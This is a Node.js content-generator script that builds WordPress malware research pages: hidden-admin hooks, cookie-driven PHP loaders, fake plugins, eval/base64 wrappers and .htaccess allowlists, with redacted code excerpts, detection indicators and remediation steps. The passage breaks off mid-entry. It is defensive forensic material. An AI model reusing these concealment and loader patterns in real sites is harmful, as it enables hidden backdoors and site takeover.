import fs from "node:fs";
import path from "node:path";
import sharp from "sharp";

const root = process.cwd();
const contentDir = path.join(root, "src", "content", "wordpress-threats");
const imageDir = path.join(root, "public", "wordpress-researches");

const guide = (title, href) => ({ title, href });
const malwareGuide = guide(
  "WordPress malware removal guide",
  "/blog/wordpress-malware-removal-expert-guide-to-clean-hacked-wordpress-site/",
);
const obfuscationGuide = guide(
  "How to recognize obfuscated PHP malware",
  "/blog/wordpress-obfuscated-php-malware-detection/",
);
const hiddenBackdoorGuide = guide(
  "Hidden WordPress backdoor investigation",
  "/blog/i-found-a-hidden-backdoor-in-a-clients-wordpress-site/",
);
const databaseGuide = guide(
  "WordPress database malware guide",
  "/blog/wordpress-database-malware-complete-guide/",
);
const redirectGuide = guide(
  "JavaScript redirect malware detection guide",
  "/blog/the-complete-guide-to-javascript-redirect-malware-detection-decoding-and-removal/",
);
const cronGuide = guide(
  "WordPress cron job malware guide",
  "/blog/wordpress-cron-job-malware/",
);
const hiddenAdminGuide = guide(
  "How to find hidden WordPress administrators",
  "/blog/how-to-find-and-remove-hidden-admin-users-in-wordpress-malware-analysis/",
);
const htaccessGuide = guide(
  "How to remove .htaccess malware",
  "/blog/the-ultimate-guide-to-removing-htaccess-malware-from-wordpress/",
);
const fakePluginGuide = guide(
  "Known fake and malicious WordPress plugins",
  "/blog/comprehensive-list-of-known-fake-and-malicious-wordpress-plugins/",
);
const service = {
  title: "WordPress malware removal",
  href: "/wordpress-malware-removal/",
};

const entries = [
  {
    file: "admin-backdoor-user-creation.md",
    title: "functions.php Hidden-Admin Query Backdoor Research",
    h1: "Hidden Administrator Query Hooks Found in functions.php",
    slug: "functions-php-hidden-admin-query-backdoor",
    description:
      "Forensic analysis of functions.php hooks that stored an administrator ID, excluded that user from queries, and changed user counts.",
    reportDate: "2026-02-01",
    category: "Hidden administrator backdoor",
    components: [
      "Active theme functions.php",
      "WordPress user queries",
      "WordPress user-count views",
    ],
    locations: ["Theme functions.php", "WordPress option _pre_user_id"],
    behaviors: [
      "Reads a stored user ID from _pre_user_id",
      "Excludes that ID from administrator user queries",
      "Reduces displayed user counts",
      "Blocks profile access and deletion for the stored ID",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The supplied code contains administrator creation logic and multiple hooks that conceal and protect the stored account. Publication omits the hard-coded password.",
    evidence:
      "Anonymized investigation with retained PHP code and four screenshots; one privacy-safe code screenshot is published",
    images: [
      {
        file: "hidden-wordpress-admin-users-functions.php-malware_evidence-1.png",
        alt: "PHP editor showing functions.php hooks that alter WordPress user queries and user counts",
        caption:
          "The visible functions.php block registers pre_user_query and views_users handlers and reads the _pre_user_id option. It confirms concealment logic, not how the code was introduced.",
        supports:
          "functions.php contained user-query and count-manipulation hooks",
      },
    ],
    confirmed: [
      "The code registers pre_user_query, views_users, load-user-edit.php, and admin_menu handlers.",
      "The identifier _pre_user_id is used to retrieve the account ID being concealed.",
      "The supplied continuation contains wp_insert_user with an administrator role.",
      "The retained database screenshot showed the named account, but it is excluded because adjacent account data is sensitive.",
    ],
    assessment:
      "The combined account-creation, query-exclusion, count-adjustment, and deletion-blocking logic is consistent with a hidden administrator backdoor. A mismatched count alone would not prove this finding; the code provides the stronger evidence.",
    unknown: [
      "The initial compromise method was not confirmed.",
      "No vulnerable plugin, theme, or affected version was identified.",
      "The evidence does not establish whether the account was used for a successful login.",
      "The hard-coded credential is not published.",
    ],
    heading: "How the hooks conceal the stored administrator ID",
    excerptLang: "php",
    excerpt:
      "add_action('pre_user_query', 'wp_admin_users_protect_user_query');\nadd_filter('views_users', 'protect_user_count');\n$id = get_option('_pre_user_id');\n// SQL exclusion, credential, and account-creation details redacted",
    high: [
      "wp_admin_users_protect_user_query",
      "protect_user_count",
      "_pre_user_id",
      "protect_user_from_deleting",
    ],
    contextual: [
      "functions.php",
      "pre_user_query",
      "wp_insert_user()",
      "administrator role",
    ],
    remediation: [
      "Preserve the infected theme file and user records before changing them.",
      "Replace the affected theme with a trusted clean copy and remove the unauthorized account through a trustworthy database or CLI path.",
      "Remove the malicious option only after recording which account ID it referenced.",
      "Rotate administrator and hosting credentials and invalidate active sessions.",
    ],
    recurrence: [
      "Compare the restored theme directory with a trusted distribution.",
      "Confirm direct database results and wp-admin user counts agree.",
      "Monitor functions.php and _pre_user_id for recreation.",
    ],
    related: [
      "wp-user-query-hidden-admin-filter",
      "wp-compatibility-patch-hidden-admin",
      "system-control-hidden-backup-restoration",
    ],
    guides: [hiddenAdminGuide, hiddenBackdoorGuide],
    cases: [],
  },
  {
    file: "cookie-based-php-execution-malware.md",
    title: "Cookie-Indexed PHP Loader in an .htaccess-Named File",
    h1: "Cookie-Indexed PHP Loader Found in an .htaccess-Named File",
    slug: "cookie-indexed-php-loader-htaccess-file",
    description:
      "Forensic review of a 308-byte PHP loader that assembled callable names from cookie values and included a generated temporary path.",
    reportDate: "2026-01-24",
    category: "Cookie-indexed PHP loader",
    components: ["PHP request cookie handling", "Plugin directory artifact"],
    locations: ["wp-content/plugins/wp-rootkit-tract/.htaccess"],
    behaviors: [
      "Reads indexed values from $_COOKIE",
      "Builds an array of callable fragments",
      "Writes decoded data to a generated path",
      "Includes the generated path",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied code constructs functions and a file path from request cookies before writing and including data. The screenshot does not prove that this .htaccess-named file was parsed as PHP.",
    evidence:
      "Anonymized investigation with one privacy-reviewed file-viewer screenshot and the retained 308-byte PHP sample",
    images: [
      {
        file: "htaccess-v2_evidence-1.png",
        alt: "File viewer showing 308 bytes of PHP in wp-rootkit-tract slash .htaccess",
        caption:
          "The file viewer shows compact PHP inside an .htaccess-named file under wp-rootkit-tract. The account portion of the path was already irreversibly redacted.",
        supports: "A 308-byte PHP loader existed at the observed plugin path",
      },
    ],
    confirmed: [
      "The file viewer identifies wp-content/plugins/wp-rootkit-tract/.htaccess and a size of 308 bytes.",
      "The code reads $_COOKIE and reconstructs values by numeric indexes.",
      "The final operation includes a generated path.",
    ],
    assessment:
      "The code is consistent with a request-gated loader that expects a specially structured cookie set. Whether the server configuration executed PHP from this filename is not shown.",
    unknown: [
      "The screenshot does not establish that the .htaccess-named file executed as PHP.",
      "No triggering request or cookie values were retained.",
      "The decoded payload and initial compromise method were not established.",
    ],
    heading: "How cookie indexes drive the loader",
    excerptLang: "php",
    excerpt:
      "$c = $_COOKIE;\n// numeric indexes assemble callable names and a temporary path\n$generated = $parts[0]() . $parts[25];\ninclude $generated; // payload construction redacted",
    high: [
      "wp-rootkit-tract/.htaccess",
      "$c[36][$n]",
      "include($generated) after cookie-derived callable assembly",
    ],
    contextual: ["$_COOKIE", "include()", ".htaccess", "plugin directory"],
    remediation: [
      "Preserve the 308-byte file and relevant request logs.",
      "Remove the untrusted wp-rootkit-tract directory after verifying it is not legitimate.",
      "Search for the same numeric-index loop and related copies.",
      "Review server handlers to determine whether PHP could execute from the observed filename.",
    ],
    recurrence: [
      "Confirm the directory and file do not return.",
      "Review access logs for unusual cookie-heavy requests where retained.",
      "Monitor the plugin directory for unexpected dotfiles.",
    ],
    related: [
      "http-header-gated-php-loader",
      "wp-config-xor-temporary-file-loader",
      "xdiff-temporary-file-php-loader",
    ],
    guides: [obfuscationGuide, hiddenBackdoorGuide],
    cases: [],
  },
  {
    file: "drive-by-script-injection.md",
    title: "hexagoncontrail-js External Script Injection Research",
    h1: "hexagoncontrail-js External Script Injection in WordPress HTML",
    slug: "hexagoncontrail-external-script-injection",
    description:
      "Evidence-led analysis of a hexagoncontrail-js script tag that loaded a defanged external resource in a drive-by incident.",
    reportDate: "2026-01-23",
    category: "External JavaScript injection",
    components: ["Rendered WordPress HTML", "Browser-executed JavaScript"],
    locations: [
      "Rendered page source",
      "External script element with ID hexagoncontrail-js",
    ],
    behaviors: [
      "Adds a script element with the ID hexagoncontrail-js",
      "Loads JavaScript from an external domain",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The retained notice and page-source evidence show the injected external script. The fetched script's runtime behavior was not retained and is not inferred.",
    evidence:
      "Anonymized drive-by investigation with a third-party incident notice, rendered source evidence, and a supplied script tag",
    images: [
      {
        file: "switch-domain-suspension-drive-by-malware_evidence-3.png",
        alt: "Incident notice identifying the hexagoncontrail-js external script element",
        caption:
          "The notice records the hexagoncontrail-js element and its external source. The affected client URL is irreversibly obscured; the image does not show the remote script's contents.",
        supports: "The external script tag was identified during the incident",
      },
    ],
    confirmed: [
      "The supplied HTML contains a script element with ID hexagoncontrail-js.",
      "Its src points to simplecopseholding[.]com using a unique path.",
      "An incident notice independently records the same element and source.",
    ],
    assessment:
      "Loading untrusted third-party JavaScript gives that resource execution context in the visitor's browser. The retained evidence does not show whether it redirected visitors, collected data, or loaded another stage.",
    unknown: [
      "The remote JavaScript response was not retained.",
      "The repository does not establish how the tag was injected.",
      "The separate obfuscated PHP sample was supplied in the same draft, but a direct operational relationship was not confirmed.",
      "The excluded screenshots contained identifiable client and contact information.",
    ],
    heading: "Why the script ID is the best detection pivot",
    excerptLang: "html",
    excerpt:
      '<script id="hexagoncontrail-js"\n  src="hxxps://simplecopseholding[.]com/[redacted-path]">\n</script>',
    high: [
      "hexagoncontrail-js",
      "simplecopseholding[.]com",
      "The script ID and domain appearing together",
    ],
    contextual: [
      "External script tag",
      "dns-prefetch resource hint",
      "Rendered page source",
    ],
    remediation: [
      "Preserve the rendered source and relevant database/file evidence.",
      "Remove the injection from its confirmed storage location once found.",
      "Search files and database records for the script ID and defanged domain.",
      "Review access and change history to identify the write path if logs permit.",
    ],
    recurrence: [
      "Recheck rendered HTML for the script ID from clean browser sessions.",
      "Search the database and filesystem after scheduled tasks run.",
      "Confirm the external resource hint and script element do not return.",
    ],
    related: [
      "c-i-icu-click-redirect-script",
      "wpinfo-pst1-database-redirect",
      "database-fetch-spam-injection",
    ],
    guides: [
      guide(
        "simplecopseholding.com malware removal guide",
        "/blog/simplecopseholding-com-wordpress-malware-removal/",
      ),
      redirectGuide,
    ],
    cases: [
      guide(
        "Drive-by domain-deactivation case study",
        "/case-studies/switch-domain-deactivation-drive-by-malware-fix/",
      ),
    ],
  },
  {
    file: "fake-plugin-advanced-linkflow-control.md",
    title: "Advanced LinkFlow Control Hidden Plugin Research",
    h1: "Advanced LinkFlow Control Plugin Concealment and Remote Fetching",
    slug: "advanced-linkflow-control-hidden-plugin",
    description:
      "Forensic analysis of Advanced LinkFlow Control code that hid its plugin entry and built visitor-context requests to a remote server.",
    reportDate: "2026-02-03",
    category: "Fake plugin with conditional fetching",
    components: [
      "WordPress plugin list",
      "Plugin initialization hooks",
      "Outbound HTTP request logic",
    ],
    locations: [
      "wp-content/plugins/advanced-linkflow-control/advanced-linkflow-control.php",
    ],
    behaviors: [
      "Removes its own plugin entry through all_plugins",
      "Restores visibility when a request parameter is present",
      "Builds an outbound request with URI, IP, referrer, language, host, and user-agent values",
      "Registers early content-insertion and fetch hooks",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied source directly shows concealment and outbound visitor-context request construction. The returned content and server-side handling were not retained.",
    evidence:
      "Anonymized investigation with a plugin-directory screenshot and retained source for advanced-linkflow-control.php",
    images: [
      {
        file: "advanced-linkflow-control_evidence-1.png",
        alt: "File manager showing the advanced-linkflow-control plugin directory and PHP file",
        caption:
          "The file manager confirms the advanced-linkflow-control directory and its 13.92 KB PHP file. Directory presence alone does not prove execution; the supplied code establishes the behavior.",
        supports:
          "The named fake-plugin artifact existed in wp-content/plugins",
      },
    ],
    confirmed: [
      "The all_plugins filter unsets plugin_basename(__FILE__) unless a request parameter is present.",
      "The class stores a hex-escaped remote URL.",
      "The request builder includes current URI, bot flag, language, IP, referrer, host, and user agent.",
      "The constructor registers loop and fetch-related hooks.",
    ],
    assessment:
      "The combined self-concealment and visitor-context remote request is consistent with conditional content delivery or cloaking. The evidence does not show what the remote endpoint returned in this investigation.",
    unknown: [
      "The initial access path and affected software version were not identified.",
      "No retained response proves the content returned by the remote server.",
      "The evidence does not establish campaign size, data retention, or a specific visitor outcome.",
    ],
    heading: "How the plugin hides from the normal Plugins screen",
    excerptLang: "php",
    excerpt:
      "add_filter('all_plugins', function ($plugins) {\n    if (isset($_GET['sp'])) return $plugins;\n    unset($plugins[plugin_basename(__FILE__)]);\n    return $plugins;\n});\n// remote URL and request details defanged elsewhere",
    high: [
      "Advanced LinkFlow Control",
      "advanced-linkflow-control.php",
      "Advanced_LinkFlow_Control",
      "all_plugins self-unset with sp visibility gate",
    ],
    contextual: [
      "all_plugins",
      "plugin_basename()",
      "wp_remote_get() or cURL",
      "cache-flush calls",
    ],
    remediation: [
      "Preserve the full plugin directory and logs before removal.",
      "Remove the untrusted directory and compare the plugin inventory with a known-good baseline.",
      "Search for its class name, directory name, and self-unset filter.",
      "Review outbound-request logs for the defanged endpoint where available.",
    ],
    recurrence: [
      "Confirm the filesystem and Plugins screen remain consistent.",
      "Monitor for recreation of the directory or class name.",
      "Review rendered pages for returned content after normal and crawler-like requests.",
    ],
    related: [
      "system-control-hidden-backup-restoration",
      "wp-security-fake-plugin-eval-loader",
      "wordpresscore-fake-plugin-remote-loader",
    ],
    guides: [fakePluginGuide, hiddenBackdoorGuide],
    cases: [],
  },
  {
    file: "goto-obfuscated-dropper.md",
    title: "goto-Obfuscated index.php Remote Loader Research",
    h1: "goto-Obfuscated Remote Loader Found in index.php",
    slug: "goto-obfuscated-index-php-loader",
    description:
      "Forensic analysis of a one-line index.php artifact using goto labels, escaped strings, and fallback HTTP retrieval functions.",
    reportDate: "2026-01-27",
    category: "Obfuscated remote PHP loader",
    components: [
      "WordPress front-controller index.php",
      "PHP outbound retrieval functions",
    ],
    locations: ["Root index.php"],
    behaviors: [
      "Uses goto labels to scramble control flow",
      "Builds strings from octal and hexadecimal escapes",
      "Defines fallback retrieval through file_get_contents, cURL, and streams",
      "Processes a retrieved value after fallback attempts",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied code directly shows obfuscated string construction and multiple remote retrieval paths. The public excerpt omits the complete endpoint and execution path.",
    evidence:
      "Anonymized investigation with one editor screenshot and a retained, truncated index.php sample",
    images: [
      {
        file: "fake-jpeg-goto-remote-dropper_evidence-1.png",
        alt: "Editor showing a one-line index.php file beginning with goto labels and escaped strings",
        caption:
          "The screenshot confirms a compact one-line PHP artifact with goto labels and escaped string fragments. It does not display the full control flow or prove a successful network request.",
        supports: "index.php contained goto-based obfuscated PHP",
      },
    ],
    confirmed: [
      "The file begins with goto and multiple generated labels.",
      "The sample constructs strings with octal and hexadecimal escapes.",
      "A helper switches among file_get_contents, cURL, and stream retrieval.",
      "The retained sample is truncated and is not repaired or completed.",
    ],
    assessment:
      "The string-building and retrieval fallbacks are consistent with a remote loader. A claim that retrieved code executed is withheld because the visible sample is incomplete and no network response was retained.",
    unknown: [
      "No outbound request log or remote response was retained.",
      "The screenshot does not prove execution.",
      "The initial compromise method and vulnerable component were not identified.",
      "The complete original code is not published.",
    ],
    heading: "Why the goto and escaped-string combination matters",
    excerptLang: "php",
    excerpt:
      'goto START;\nPATH: $remotePath = "\\57\\167...";\n// fallback retrieval cases: file_get_contents, cURL, stream\nSTART: /* labels and endpoint fragments redacted */',
    high: [
      "AX1iG retrieval helper",
      "goto labels combined with escaped remote-path strings",
      "Three fallback HTTP retrieval methods in one index.php artifact",
    ],
    contextual: ["index.php", "goto", "file_get_contents()", "curl_exec()"],
    remediation: [
      "Preserve the infected index.php before replacement.",
      "Replace it with the correct clean WordPress front controller.",
      "Search for the same helper name, labels, and escaped path fragments.",
      "Review egress and access logs if available.",
    ],
    recurrence: [
      "Compare index.php against a trusted checksum after scheduled tasks run.",
      "Monitor root PHP files for long one-line changes.",
      "Confirm related retrieval signatures do not reappear.",
    ],
    related: [
      "privdayz-obfuscated-index-php",
      "tokensdeguards-index-php-loader",
      "wp-config-xor-temporary-file-loader",
    ],
    guides: [obfuscationGuide, malwareGuide],
    cases: [
      guide(
        "Regenerating index.php malware case study",
        "/case-studies/case-study-fix-regenerating-index-php-malware-wordpress/",
      ),
    ],
  },
  {
    file: "hidden-casino-content-injection.md",
    title: "hide-hidden-posts.php MU-Plugin Concealment Research",
    h1: "hide-hidden-posts.php MU-Plugin and Concealed Post IDs",
    slug: "hide-hidden-posts-mu-plugin",
    description:
      "Forensic review of an MU-plugin that read apft_hidden_post_ids and removed selected posts from queries and published counts.",
    reportDate: "2026-02-07",
    category: "Post-concealment MU plugin",
    components: [
      "WordPress MU plugins",
      "Post queries",
      "Published post counts",
    ],
    locations: [
      "wp-content/mu-plugins/hide-hidden-posts.php",
      "WordPress option apft_hidden_post_ids",
    ],
    behaviors: [
      "Reads post IDs from apft_hidden_post_ids",
      "Adds selected IDs to post__not_in",
      "Subtracts selected published posts from counts",
    ],
    confidence: "High",
    severity: "Medium",
    rationale:
      "The code directly supports post concealment. Casino content was visible during the same investigation, but the evidence does not prove this file created that content.",
    evidence:
      "Anonymized investigation with an MU-plugin directory screenshot, a visible casino post screenshot, and retained hide-hidden-posts.php code",
    images: [
      {
        file: "hidden-posts_evidence-2.png",
        alt: "WordPress file manager showing hide-hidden-posts.php inside the mu-plugins directory",
        caption:
          "The file manager confirms hide-hidden-posts.php beside db.php and mu-helper.php in mu-plugins. It does not identify which component created any spam post.",
        supports: "hide-hidden-posts.php existed in the MU-plugin directory",
      },
      {
        file: "hidden-posts_evidence-1.png",
        alt: "Rendered WordPress post displaying Italian casino-related text",
        caption:
          "A casino-related post was visible during the same anonymized investigation. The screenshot confirms the content symptom, not that hide-hidden-posts.php created it.",
        supports: "Casino-related content was visible during the investigation",
      },
    ],
    confirmed: [
      "The file was present under wp-content/mu-plugins.",
      "apft_get_hidden_ids reads apft_hidden_post_ids and converts values to integers.",
      "pre_get_posts adds those IDs to post__not_in under the coded conditions.",
      "wp_count_posts reduces the published count for matching IDs.",
    ],
    assessment:
      "The code is designed to conceal selected posts from administrative queries and counts. It could hide unwanted content, but creation of the visible casino post is not shown in this sample.",
    unknown: [
      "The evidence does not show which code created the casino post.",
      "The relationship between db.php, mu-helper.php, and hide-hidden-posts.php was not established.",
      "The initial compromise method and selected option values were not retained.",
    ],
    heading: "How apft_hidden_post_ids changes post visibility",
    excerptLang: "php",
    excerpt:
      "$ids = get_option('apft_hidden_post_ids', []);\n// validated IDs are merged into post__not_in\n$query->set('post__not_in', $ids);\n// count-adjustment query details shortened",
    high: [
      "hide-hidden-posts.php",
      "apft_hidden_post_ids",
      "apft_get_hidden_ids",
      "post__not_in plus wp_count_posts adjustment",
    ],
    contextual: [
      "mu-plugins",
      "pre_get_posts",
      "wp_count_posts",
      "casino-related post",
    ],
    remediation: [
      "Preserve the MU-plugin and option value before changes.",
      "Remove the untrusted file and review every neighboring MU-plugin against a known baseline.",
      "Identify the selected post IDs directly in the database and review their authors, content, and status.",
      "Remove unauthorized content only after preserving needed evidence.",
    ],
    recurrence: [
      "Confirm apft_hidden_post_ids does not return.",
      "Compare direct database post counts with wp-admin counts.",
      "Monitor mu-plugins and post records for recreation.",
    ],
    related: [
      "wp-user-query-hidden-admin-filter",
      "m6bmm64-hidden-anchor-injection",
      "ushort-company-post-content-redirect",
    ],
    guides: [
      databaseGuide,
      guide("How to stop WordPress spam", "/blog/how-to-stop-wordpress-spam/"),
    ],
    cases: [
      guide(
        "SEO spam traffic-spike case study",
        "/case-studies/unrelated-keyword-traffic-spike-wordpress-seo-spam/",
      ),
    ],
  },
  {
    file: "hidden-plugin-backdoor.md",
    title: "WP-Security Fake Plugin eval Loader Research",
    h1: "WP-Security Fake Plugin with an eval Decode Wrapper",
    slug: "wp-security-fake-plugin-eval-loader",
    description:
      "Forensic review of a WP-Security plugin directory and a PHP wrapper using eval, gzinflate, and base64_decode around an encoded payload.",
    reportDate: "2026-01-21",
    category: "Fake security plugin encoded loader",
    components: [
      "WordPress plugins directory",
      "PHP decode-and-evaluate wrapper",
    ],
    locations: ["wp-content/plugins/WP-Security/"],
    behaviors: [
      "Presents a security-themed plugin header",
      "Passes an encoded blob through base64_decode and gzinflate",
      "Passes the decoded result to eval",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied source contains a direct decode-and-evaluate wrapper under a deceptive security-themed identity. The decoded payload is deliberately not published or characterized beyond retained evidence.",
    evidence:
      "Anonymized investigation with one filesystem screenshot and retained PHP wrapper source",
    images: [
      {
        file: "wp-security-hidden-plugin_evidence-1.png",
        alt: "Filesystem listing showing an uppercase WP-Security directory among WordPress plugins",
        caption:
          "The screenshot confirms the WP-Security directory in the plugin path. The directory name alone is contextual; the supplied eval wrapper establishes the malicious behavior.",
        supports: "The WP-Security directory existed among installed plugins",
      },
    ],
    confirmed: [
      "A directory named WP-Security was present in wp-content/plugins.",
      "The supplied file declares a security-themed plugin identity.",
      "The PHP wrapper nests base64_decode and gzinflate inside eval.",
    ],
    assessment:
      "The identity and decode-and-evaluate wrapper are consistent with a fake plugin loader. The encoded body may implement additional behavior, but it was not decoded for this public analysis.",
    unknown: [
      "The decoded payload is not published and its capabilities are not asserted.",
      "The screenshot does not prove activation or execution.",
      "The initial access path and any affected legitimate component were not identified.",
    ],
    heading: "Why the decode wrapper is stronger than the folder name",
    excerptLang: "php",
    excerpt:
      "/** Plugin Name: WordPress Security */\n// encoded body removed\neval(gzinflate(base64_decode('[REDACTED ENCODED PAYLOAD]')));",
    high: [
      "WP-Security directory with the supplied wrapper",
      "Security-themed plugin header plus eval(gzinflate(base64_decode(...)))",
      "Text Domain: wp-security in this artifact",
    ],
    contextual: ["WP-Security", "base64_decode()", "gzinflate()", "eval()"],
    remediation: [
      "Preserve the directory and full encoded sample privately.",
      "Remove the untrusted plugin directory and compare the entire plugins tree with a known inventory.",
      "Search for the same header text and nested wrapper.",
      "Replace altered plugins with trusted copies.",
    ],
    recurrence: [
      "Verify the WP-Security directory does not return.",
      "Monitor for new plugin directories with security-themed names.",
      "Repeat the structural wrapper search after scheduled tasks and logins.",
    ],
    related: [
      "advanced-linkflow-control-hidden-plugin",
      "wordpresscore-fake-plugin-remote-loader",
      "wp-compatibility-patch-hidden-admin",
    ],
    guides: [fakePluginGuide, obfuscationGuide],
    cases: [],
  },
  {
    file: "htaccess-injection-fake-index-php-dropper.md",
    title: "Selective PHP Allowlist .htaccess Injection Research",
    h1: "Selective PHP Allowlist Rules Found in a Malicious .htaccess",
    slug: "htaccess-php-allowlist-injection",
    description:
      "Forensic analysis of .htaccess rules that denied broad PHP access while allowing a distinctive list of suspicious PHP filenames.",
    reportDate: "2026-01-27",
    category: "Selective .htaccess PHP allowlist",
    components: ["Apache access-control configuration", "WordPress PHP paths"],
    locations: [
      "Observed .htaccess artifact",
      "A directory containing about.php",
    ],
    behaviors: [
      "Denies access to broad py, exe, and php filename matches",
      "Allows a named list of PHP files",
      "Includes standard-looking front-controller rewrite rules",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The screenshot and supplied configuration show a deny-by-extension rule followed by an allowlist of unusual PHP filenames. Generic error screenshots are excluded because they do not prove the mechanism.",
    evidence:
      "Anonymized investigation with four screenshots and supplied .htaccess plus separate obfuscated index.php samples",
    images: [
      {
        file: "index-php-obfuscated-dropper-htaccess-dos_evidence-1.png",
        alt: "Editor showing FilesMatch rules that deny PHP broadly and allow named PHP files",
        caption:
          "The configuration denies broad PHP access, then allows a distinctive filename list including about.php and lock360.php. This directly supports selective access-control tampering.",
        supports: "The .htaccess artifact contained a selective PHP allowlist",
      },
      {
        file: "index-php-obfuscated-dropper-htaccess-dos_evidence-4.png",
        alt: "Directory listing showing about.php as the only visible PHP file",
        caption:
          "The directory view confirms an about.php artifact matching the allowlist. It does not show that the file executed or establish its contents.",
        supports:
          "An allowlisted filename was present in the observed directory",
      },
    ],
    confirmed: [
      "The .htaccess rule denies files matching broad executable extensions.",
      "A second FilesMatch rule allows a specific list including about.php, radio.php, lock360.php, and misspelled wp-l0gin.php.",
      "A directory screenshot shows about.php.",
      "The separately supplied index.php sample contains an encoded eval path, but the evidence does not prove it belonged to the same execution chain.",
    ],
    assessment:
      "The rule set is consistent with restricting ordinary PHP files while preserving access to selected attacker-named files. The 403 and 500 screenshots were excluded because error pages alone do not attribute cause.",
    unknown: [
      "The exact directory scope and number of copies were not retained.",
      "No request log proves an allowlisted file was invoked.",
      "A direct relationship between the .htaccess rule and supplied index.php sample was not confirmed.",
      "The original write mechanism was not identified.",
    ],
    heading: "Why the allowlisted filenames matter",
    excerptLang: "apache",
    excerpt:
      '<FilesMatch ".(py|exe|php)$">\n  Deny from all\n</FilesMatch>\n<FilesMatch "^(about.php|radio.php|lock360.php|[other names redacted])$">\n  Allow from all\n</FilesMatch>',
    high: [
      "lock360.php",
      "wp-l0gin.php",
      "Broad PHP deny rule followed by a named PHP allowlist",
      "about.php present beside the rule",
    ],
    contextual: [".htaccess", "FilesMatch", "403 response", "500 response"],
    remediation: [
      "Preserve representative rules and allowlisted files before cleanup.",
      "Replace malicious .htaccess copies with directory-appropriate trusted configuration.",
      "Inspect every allowlisted filename and remove confirmed malicious artifacts.",
      "Search recursively for the exact filename list and rule ordering.",
    ],
    recurrence: [
      "Re-run the recursive rule search after normal traffic and cron tasks.",
      "Confirm expected PHP endpoints respond according to the clean configuration.",
      "Monitor for recreation of the allowlisted filenames.",
    ],
    related: [
      "mixed-case-php-htaccess-deny-rule",
      "goto-obfuscated-index-php-loader",
      "privdayz-obfuscated-index-php",
    ],
    guides: [htaccessGuide, malwareGuide],
    cases: [],
  },
  {
    file: "infected-functions-php-stealing-logins-fake-plugin.md",
    title: "functions.php wp-perf-analytics Plugin Deployer Research",
    h1: "wp-perf-analytics Plugin Deployer Embedded in functions.php",
    slug: "functions-php-wp-perf-analytics-deployer",
    description:
      "Forensic analysis of a self-cleaning functions.php block that staged an encoded wp-perf-analytics plugin under wp-content.",
    reportDate: "2026-04-23",
    category: "Theme-based fake-plugin deployer",
    components: [
      "Active theme functions.php",
      "WordPress plugins directory",
      "Deployer flag under wp-content",
    ],
    locations: [
      "Active theme functions.php",
      "wp-content/plugins/wp-perf-analytics/",
      "wp-content/.plugin_deployer_*",
    ],
    behaviors: [
      "Runs a marked deployer block on init",
      "Creates the wp-perf-analytics plugin directory",
      "Decodes an embedded plugin body",
      "Uses a flag file to throttle deployment",
      "Attempts to remove its own marked block",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The supplied code and screenshot show plugin creation, an embedded payload, a deployment flag, and self-cleaning logic. The full plugin payload is withheld.",
    evidence:
      "Anonymized investigation with two code screenshots and a retained representative functions.php sample",
    images: [
      {
        file: "functions.php-malware_evidence-2.png",
        alt: "PHP editor showing the plugin_deployer block and wp-perf-analytics slug in functions.php",
        caption:
          "The visible block identifies wp-perf-analytics, a .plugin_deployer flag, self-cleaning logic, and an encoded payload. Only the structural evidence is reproduced publicly.",
        supports:
          "functions.php contained a self-cleaning wp-perf-analytics deployer",
      },
    ],
    confirmed: [
      "The block is marked __plugin_deployer__ and runs on init.",
      "The slug is set to wp-perf-analytics and the target path is under WP_CONTENT_DIR/plugins.",
      "A .plugin_deployer_ flag is written under wp-content.",
      "The code contains regex-based removal of its own marked block and opcode invalidation.",
    ],
    assessment:
      "The block operates as an installer intended to leave the wp-perf-analytics component behind after the visible theme injection removes itself. This page focuses on deployment; the related credential-logging behavior is documented separately.",
    unknown: [
      "The complete dropped plugin body is not published.",
      "The evidence does not establish how functions.php was first modified.",
      "No vulnerable theme or plugin version was identified.",
      "The retained screenshots do not prove every deployment attempt succeeded.",
    ],
    heading: "How the deployer stages and then hides its installer",
    excerptLang: "php",
    excerpt:
      "/* __plugin_deployer__ */\n$slug = 'wp-perf-analytics';\n$dir = WP_CONTENT_DIR . '/plugins/' . $slug;\n$flag = WP_CONTENT_DIR . '/.plugin_deployer_' . md5(__FILE__);\n// encoded plugin body and self-rewrite details redacted",
    high: [
      "__plugin_deployer__",
      "wp-perf-analytics",
      ".plugin_deployer_",
      "Self-removal markers plus opcode invalidation",
    ],
    contextual: [
      "functions.php",
      "init hook",
      "base64_decode()",
      "WP_CONTENT_DIR/plugins",
    ],
    remediation: [
      "Preserve the infected theme file, flag, and dropped directory.",
      "Replace the full theme with a trusted copy and remove the untrusted plugin directory.",
      "Search wp-content for deployer markers and flag files.",
      "Rotate credentials because the related investigation also retained credential-logging evidence.",
    ],
    recurrence: [
      "Confirm the plugin directory and flag do not return.",
      "Monitor functions.php for the marked block after traffic and logins.",
      "Compare plugin state and filesystem inventory over time.",
    ],
    related: [
      "functions-php-credential-logger-fake-png",
      "media-patcher-lab-mu-plugin",
      "system-control-hidden-backup-restoration",
    ],
    guides: [hiddenBackdoorGuide, malwareGuide],
    cases: [],
  },
  {
    file: "japanese-seo-spam-injection-php.md",
    title: "esc_html Array-Assembly PHP eval Loader Research",
    h1: "esc_html Array-Assembly eval Loader Found in PHP",
    slug: "esc-html-array-php-eval-loader",
    description:
      "Forensic review of a PHP artifact that assembled callable names from esc_html-prefixed arrays and evaluated a nested decoded payload.",
    reportDate: "2026-02-05",
    category: "Array-assembled PHP eval loader",
    components: ["Injected PHP code", "Runtime function-name construction"],
    locations: [
      "Supplied malware.php sample; exact deployed path not retained",
    ],
    behaviors: [
      "Stores encoded fragments in esc_html_gp",
      "Builds callable names from indexed characters in esc_html_ft",
      "Nests the generated callables and passes the result to eval",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied code directly shows array-based function construction and evaluation. It does not contain visible Japanese content or prove SEO-spam generation, so that legacy claim is removed.",
    evidence:
      "Anonymized investigation with a retained PHP screenshot and supplied truncated code sample; the full encoded screenshot is excluded from publication",
    images: [],
    confirmed: [
      "The variables esc_html_gp and esc_html_ft hold encoded strings and character fragments.",
      "Three function names are assembled from indexed array values.",
